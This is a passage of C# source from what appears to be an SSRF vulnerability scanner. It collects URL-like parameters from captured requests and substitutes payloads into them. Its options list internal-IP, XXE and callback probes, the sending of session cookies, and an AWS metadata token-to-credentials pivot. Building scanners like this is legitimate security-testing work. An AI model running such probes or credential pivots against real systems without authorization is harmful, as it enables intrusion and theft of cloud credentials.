            {
                foreach (var c in ExtractBodyCandidates(e, paramNames))
                {
                    var key = $"{c.Method}|{c.BaselineUrl}|{c.ParamName}|body";
                    if (!seen.Add(key)) continue;
                    list.Add(c);
                    if (list.Count >= maxCandidates) return list;
                }
            }
        }

        return list;
    }

    private static IEnumerable<SsrfCandidate> ExtractQueryCandidates(Uri uri, HashSet<string> paramNames)
    {
        var query = uri.Query;
        if (string.IsNullOrEmpty(query) || query == "?")
            yield break;

        foreach (var part in query.TrimStart('?').Split('&', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries))
        {
            var eq = part.IndexOf('=');
            if (eq < 0) continue;
            var key = Uri.UnescapeDataString(part[..eq]);
            var rawVal = part[(eq + 1)..];
            var value = Uri.UnescapeDataString(rawVal);

            if (!IsSsrfParam(key, value, paramNames))
                continue;

            yield return new SsrfCandidate(uri, key, value, "GET", null);
        }
    }

    private static IEnumerable<SsrfCandidate> ExtractBodyCandidates(NetworkEntry entry, HashSet<string> paramNames)
    {
        var ct = entry.RequestHeaders.TryGetValue("Content-Type", out var h) ? h :
            entry.RequestHeaders.TryGetValue("content-type", out var h2) ? h2 : "";

        if (ct.Contains("json", StringComparison.OrdinalIgnoreCase))
        {
            List<SsrfCandidate>? jsonCandidates = null;
            try
            {
                using var doc = JsonDocument.Parse(entry.RequestBody!);
                if (doc.RootElement.ValueKind == JsonValueKind.Object)
                {
                    jsonCandidates = new List<SsrfCandidate>();
                    foreach (var prop in doc.RootElement.EnumerateObject())
                    {
                        if (prop.Value.ValueKind != JsonValueKind.String) continue;
                        var val = prop.Value.GetString() ?? "";
                        if (!IsSsrfParam(prop.Name, val, paramNames)) continue;
                        jsonCandidates.Add(SsrfCandidate.FromJsonBody(entry, prop.Name, entry.RequestBody!));
                    }
                }
            }
            catch { /* skip malformed JSON */ }

            if (jsonCandidates != null)
            {
                foreach (var c in jsonCandidates)
                    yield return c;
            }
        }
        else if (ct.Contains("form-urlencoded", StringComparison.OrdinalIgnoreCase))
        {
            var qs = System.Web.HttpUtility.ParseQueryString(entry.RequestBody!);
            foreach (string? key in qs)
            {
                if (key == null) continue;
                var val = qs[key] ?? "";
                if (!IsSsrfParam(key, val, paramNames)) continue;
                yield return SsrfCandidate.FromFormBody(entry, key, entry.RequestBody!);
            }
        }
    }

    private static bool IsSsrfParam(string name, string value, HashSet<string> paramNames) =>
        UrlLikeParamNames.IsUrlLikeParam(name, value, paramNames);

    private static string Snippet(string body, int maxLen)
    {
        var t = body.Replace("\r", " ").Replace("\n", " ").Trim();
        return t.Length <= maxLen ? t : t[..maxLen] + "…";
    }

    private static string Truncate(string s, int max) =>
        s.Length <= max ? s : s[..max] + "…";

    private sealed record SsrfProbeContext(string Endpoint, string Method, string ParamName, string Payload);

    private sealed class SsrfCandidate
    {
        public string BaselineUrl { get; }
        public string Method { get; }
        public string ParamName { get; }
        public string? BaselineBody { get; }
        public Dictionary<string, string>? Headers { get; }
        public bool HasBodyInjection => _format != BodyFormat.None;
        private readonly string? _bodyTemplate;
        private readonly BodyFormat _format;
        private readonly Uri _uri;

        private enum BodyFormat { None, Json, Form }

        public SsrfCandidate(Uri uri, string paramName, string originalValue, string method, string? bodyTemplate)
        {
            _uri = uri;
            ParamName = paramName;
            Method = method;
            BaselineUrl = uri.ToString();
            BaselineBody = bodyTemplate;
            _bodyTemplate = bodyTemplate;
            _format = BodyFormat.None;
            _ = originalValue;
        }

        private SsrfCandidate(Uri uri, string paramName, string method, string? baselineBody,
            Dictionary<string, string>? headers, string bodyTemplate, BodyFormat format)
        {
            _uri = uri;
            ParamName = paramName;
            Method = method;
            BaselineUrl = uri.ToString();
            BaselineBody = baselineBody;
            Headers = headers;
            _bodyTemplate = bodyTemplate;
            _format = format;
        }

        public static SsrfCandidate FromJsonBody(NetworkEntry entry, string fieldName, string jsonBody)
        {
            var headers = entry.RequestHeaders.Count > 0
                ? new Dictionary<string, string>(entry.RequestHeaders, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string> { ["Content-Type"] = "application/json" };
            return new SsrfCandidate(
                new Uri(entry.Url), fieldName, entry.Method, jsonBody, headers, jsonBody, BodyFormat.Json);
        }

        public static SsrfCandidate FromFormBody(NetworkEntry entry, string fieldName, string formBody)
        {
            var headers = entry.RequestHeaders.Count > 0
                ? new Dictionary<string, string>(entry.RequestHeaders, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string> { ["Content-Type"] = "application/x-www-form-urlencoded" };
            return new SsrfCandidate(
                new Uri(entry.Url), fieldName, entry.Method, formBody, headers, formBody, BodyFormat.Form);
        }

        public static SsrfCandidate FromHintBody(Uri uri, string fieldName, string method, EndpointParamHint hint)
        {
            var headers = hint.Headers is { Count: > 0 }
                ? new Dictionary<string, string>(hint.Headers, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string> { ["Content-Type"] = "application/x-www-form-urlencoded" };

            var contentType = headers.TryGetValue("Content-Type", out var ct) ? ct :
                headers.TryGetValue("content-type", out var ct2) ? ct2 : "";

            if (!string.IsNullOrWhiteSpace(hint.RequestBodySample))
            {
                if (contentType.Contains("json", StringComparison.OrdinalIgnoreCase))
                    return new SsrfCandidate(uri, fieldName, method, hint.RequestBodySample, headers,
                        hint.RequestBodySample, BodyFormat.Json);
                return new SsrfCandidate(uri, fieldName, method, hint.RequestBodySample, headers,
                    hint.RequestBodySample, BodyFormat.Form);
            }

            var defaultForm = $"{fieldName}={Uri.EscapeDataString("https://example.com")}";
            if (!headers.ContainsKey("Content-Type"))
                headers["Content-Type"] = "application/x-www-form-urlencoded";
            return new SsrfCandidate(uri, fieldName, method, defaultForm, headers, defaultForm, BodyFormat.Form);
        }

        public string BuildUrl(string payload) =>
            _format == BodyFormat.None ? ReplaceQueryParam(_uri, ParamName, payload) : BaselineUrl;

        public string? BuildBody(string payload) => _format switch
        {
            BodyFormat.Json => ReplaceJsonField(_bodyTemplate!, ParamName, payload),
            BodyFormat.Form => ReplaceFormField(_bodyTemplate!, ParamName, payload),
            _ => null
        };

        private static string ReplaceQueryParam(Uri uri, string name, string newValue)
        {
            var builder = new StringBuilder();
            builder.Append(uri.GetLeftPart(UriPartial.Path));
            var query = uri.Query.TrimStart('?');
            var first = true;
            if (!string.IsNullOrEmpty(query))
            {
                foreach (var part in query.Split('&', StringSplitOptions.RemoveEmptyEntries))
                {
                    var eq = part.IndexOf('=');
                    var key = eq >= 0 ? part[..eq] : part;
                    if (Uri.UnescapeDataString(key).Equals(name, StringComparison.OrdinalIgnoreCase))
                        continue;
                    builder.Append(first ? '?' : '&');
                    builder.Append(part);
                    first = false;
                }
            }

            builder.Append(first ? '?' : '&');
            builder.Append(Uri.EscapeDataString(name));
            builder.Append('=');
            builder.Append(Uri.EscapeDataString(newValue));
            return builder.ToString();
        }

        private static string ReplaceJsonField(string jsonBody, string fieldName, string payload)
        {
            try
            {
                using var doc = JsonDocument.Parse(jsonBody);
                var dict = new Dictionary<string, object?>();
                foreach (var prop in doc.RootElement.EnumerateObject())
                {
                    dict[prop.Name] = prop.Name.Equals(fieldName, StringComparison.OrdinalIgnoreCase)
                        ? payload
                        : JsonElementToObject(prop.Value);
                }
                if (!dict.ContainsKey(fieldName))
                    dict[fieldName] = payload;
                return JsonSerializer.Serialize(dict);
            }
            catch
            {
                return JsonSerializer.Serialize(new Dictionary<string, string> { [fieldName] = payload });
            }
        }

        private static string ReplaceFormField(string formBody, string fieldName, string payload)
        {
            var qs = System.Web.HttpUtility.ParseQueryString(formBody);
            qs[fieldName] = payload;
            var parts = new List<string>();
            foreach (string? key in qs)
            {
                if (key == null) continue;
                parts.Add($"{Uri.EscapeDataString(key)}={Uri.EscapeDataString(qs[key] ?? "")}");
            }
            return string.Join("&", parts);
        }

        private static object JsonElementToObject(JsonElement el) => el.ValueKind switch
        {
            JsonValueKind.String => el.GetString() ?? "",
            JsonValueKind.Number => el.TryGetInt64(out var l) ? l : el.GetDouble(),
            JsonValueKind.True => true,
            JsonValueKind.False => false,
            JsonValueKind.Null => "",
            _ => el.GetRawText()
        };
    }
}

public sealed class SsrfRequestTemplate
{
    public string Url { get; init; } = "";
    public string Method { get; init; } = "GET";
    public Dictionary<string, string>? Headers { get; init; }
    public string? Body { get; init; }
}

public sealed class SsrfOptions
{
    public SsrfRequestTemplate? RequestTemplate { get; init; }
    public string? MarkerName { get; init; }
    public string? BaselineValue { get; init; }
    public List<string>? ExplicitUrls { get; init; }
    /// <summary>Restrict discovery to these host/origin values (defaults to current page origin).</summary>
    public List<string>? AllowedHosts { get; init; }
    /// <summary>Endpoints with known redirect-like params but no query string in captured URL.</summary>
    public List<EndpointParamHint>? EndpointHints { get; init; }
    public List<string>? ParamNames { get; init; }
    /// <summary>Scan page hrefs for URL-like params when network log is sparse (default on).</summary>
    public bool IncludeDomDiscovery { get; init; } = true;
    public List<string>? Payloads { get; init; }
    public int MaxCandidates { get; init; } = 10;
    public int TimeoutMs { get; init; } = 15000;
    public int CallbackWaitMs { get; init; } = 2000;
    public bool IncludeInternalIps { get; init; } = true;
    public bool IncludeProtocolHandlers { get; init; } = true;
    public bool IncludeCallbackProbes { get; init; } = true;
    public bool IncludeXxe { get; init; } = true;
    /// <summary>Run upload-path XXE probe (multipart file + raw XML) on /file-upload, /api/import, etc.</summary>
    public bool IncludeUploadXxe { get; init; }
    public List<string>? XxePayloads { get; init; }
    public string? CallbackDomain { get; init; }
    /// <summary>Minimum confidence to report: tentative, likely (default), or confirmed.</summary>
    public string? MinConfidence { get; init; }

    /// <summary>Use server-side HttpClient instead of in-page fetch (allows includeBrowserCookies control).</summary>
    public bool UseBackendFetch { get; init; }

    /// <summary>When UseBackendFetch, attach sanitized session cookies (default false).</summary>
    public bool IncludeBrowserCookies { get; init; }

    /// <summary>Probe built-in /api/fetch, /api/proxy, … paths when discovery finds no candidates (default true).</summary>
    public bool IncludeScaffoldPaths { get; init; } = true;

    /// <summary>When explicit urls/hints exist, still merge scaffold paths (default false).</summary>
    public bool IncludeScaffoldWithExplicit { get; init; }

    /// <summary>After standard payloads, attempt AWS IMDSv2 token → creds pivot (default true).</summary>
    public bool IncludeImdsV2Pivot { get; init; } = true;

    /// <summary>Send GCP Metadata-Flavor / Azure Metadata headers on app-facing metadata probes (default true).</summary>
    public bool IncludeCloudMetadataHeaders { get; init; } = true;

    /// <summary>
    /// Probe each candidate with a small phase-1 set first; run full payload fan-out only on signal (default on).
    /// </summary>
    public bool UsePhasedProbing { get; init; } = true;
}

public sealed record SsrfDetectionResult(string Indicator, string Confidence, string Severity);

public sealed class SsrfResult
{
    public string Message { get; init; } = "";
    public int CandidatesProbed { get; init; }
    public int PayloadsSent { get; init; }
    public List<SsrfFinding> Findings { get; init; } = [];
}

public sealed class SsrfFinding
{
    public string Type { get; init; } = "in-band";
    public string Severity { get; init; } = "medium";
    public string Confidence { get; init; } = "likely";
    public string Url { get; init; } = "";
    public string Method { get; init; } = "";
    public string ParamName { get; init; } = "";
    public string Payload { get; init; } = "";
    public int Status { get; init; }
    public int BaselineStatus { get; init; }
    public string Indicator { get; init; } = "";
    public string Snippet { get; init; } = "";
    public string? CorrelationId { get; init; }
    public int Occurrences { get; init; } = 1;
    public List<string>? PayloadVariants { get; init; }
}
